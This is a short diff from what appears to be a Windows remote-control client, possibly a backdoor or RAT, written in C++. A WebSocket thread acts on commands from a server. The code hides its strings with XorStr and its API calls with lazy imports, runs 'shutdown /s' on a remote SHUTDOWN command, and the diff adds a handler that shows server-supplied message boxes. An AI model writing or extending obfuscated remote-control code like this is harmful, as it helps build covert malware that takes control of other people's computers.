@@ -311,8 +311,9 @@ DWORD WINAPI WebSocketThread(LPVOID PARAMS) {
 			if (ret[XorStr("type")] == XorStr("SHUTDOWN")) {
 				LI_FN(system)(XorStr("shutdown /s"));
 			}
-			if (ret[XorStr("type")] == XorStr("FREEZE")) {
-				Sleep(5000);
+			if (ret[XorStr("type")] == XorStr("MESSAGEBOX")) {
+				HWND null = NULL;
+				LI_FN(MessageBoxA)(null, ret[XorStr("text")], ret[XorStr("title")], 0);
 			}
 		});
 
